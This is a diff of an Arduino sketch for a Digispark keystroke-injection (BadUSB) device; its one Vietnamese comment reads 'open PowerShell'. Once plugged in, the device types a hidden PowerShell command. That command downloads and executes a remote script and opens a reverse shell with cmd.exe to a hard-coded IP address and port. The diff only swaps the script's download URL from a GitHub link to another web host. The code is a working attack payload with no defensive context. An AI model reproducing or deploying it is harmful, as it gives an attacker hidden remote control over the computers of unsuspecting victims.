@@ -11,7 +11,7 @@ void setup() {
   // Mở PowerShell
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(1000);
-  DigiKeyboard.println("powershell -W hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/huyremy/netcat/main/power.ps1');huyremy -c 97.74.89.193 -p 6868 -e cmd.exe");
+  DigiKeyboard.println("powershell -W hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://matilda.vn/power.ps1');huyremy -c 97.74.89.193 -p 6868 -e cmd.exe");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
 }
